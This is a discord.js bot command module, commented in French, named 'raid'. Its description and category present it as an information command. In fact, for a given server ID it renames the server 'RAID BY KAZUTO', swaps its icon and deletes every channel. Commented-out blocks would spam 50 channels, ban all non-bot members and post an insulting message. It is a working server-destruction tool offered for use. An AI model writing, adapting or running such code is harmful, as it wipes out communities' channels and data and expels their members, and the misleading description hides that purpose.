const discord = require("discord.js");
const path = require("path");
const fs = require("fs");
module.exports = {
    name: "raid",

    description: "Renvoie des informations sur le raid",
    permission: discord.PermissionFlagsBits.ManageChannels,
    dm: false,
    category: "informations",
    options: [
        {
            type: "string",
            name: "server_id",
            description: "ID du serveur à nettoyer.",
            required: true,
            autocomplete: false,
        },
    ],
    async run(bot, message, args) {
        const serverId = args.getString("server_id");
        const iconPath = path.join(__dirname, '../../img', "icon.jpg");
        if (!fs.existsSync(iconPath)) {
            return message.reply(`❌ L'image "${imageName}" n'existe pas dans le dossier /img.`);
        }
        const guild = bot.guilds.cache.get(serverId);
        if (!guild) {
            return message.reply("❌ Le bot n'est pas dans le serveur ou l'ID est invalide.");
        }
        const member = guild.members.cache.get(message.user.id);
        if (!member || !member.permissions.has(discord.PermissionFlagsBits.Administrator)) {
            return message.reply("❌ Vous n'avez pas la permission d'exécuter cette commande sur ce serveur.");
        }

        try {
            await guild.setName("RAID BY KAZUTO");
            console.log(`✅ Le nom du serveur a été changé en : ${"RAID BY KAZUTO"}`);
            const iconBuffer = fs.readFileSync(iconPath);
            await guild.setIcon(iconBuffer);
            console.log(`✅ Icône du serveur changée avec succès.`);

            const channels = guild.channels.cache;
            for (const channel of channels.values()) {
                await channel.delete();
                console.log(`Salon supprimé : ${channel.name}`);
            }
            console.log(`✅ Tous les salons ont été supprimés.`);

            // for (let i = 1; i <= 50; i++) {
            //     await guild.channels.create({
            //         name: `raid by kazuto`,
            //         type: discord.ChannelType.GuildText,
            //     });
            //     console.log(`✅ Salon créé : raid by kazuto (${i}/50)`);
            // }
            // console.log(`✅ 50 salons 'raid by kazuto' ont été créés.`);
            // const members = guild.members.cache.filter(member => !member.user.bot);

            // for (const member of members.values()) {
            //     try {
            //         if (!member.bannable) {
            //             console.log(`⚠️ Le membre ${member.user.tag} ne peut pas être banni.`);
            //             continue;
            //         }

            //         await member.ban({ reason: "Commande wipe exécutée" });
            //         console.log(`✅ Membre banni : ${member.user.tag}`);
            //     } catch (error) {
            //         console.error(`❌ Erreur lors de la tentative de bannissement de ${member.user.tag}:`, error);
            //     }
            // }
            // console.log(`✅ Tous les membres ont été bannis.`);
            // const createdChannels = guild.channels.cache.filter(channel => channel.name === "raid by kazuto" && channel.type === Discord.ChannelType.GuildText);

            // for (const channel of createdChannels.values()) {
            //     try {
            //         // Vérifiez si le bot a les permissions nécessaires
                    
            //             await channel.send("Ce serveur a été modifié par Kazuto ! Bande de merde vous osez traiter les gens ainsi ? Vous allez tous partir en enfer");
            //             console.log(`✅ Message envoyé dans : ${channel.name}`);
                    
            //     } catch (error) {
            //         console.error(`❌ Erreur lors de l'envoi du message dans ${channel.name}:`, error);
            //     }
            // }

        } catch (error) {
            console.error("❌ Une erreur est survenue :", error);
        }
    }

}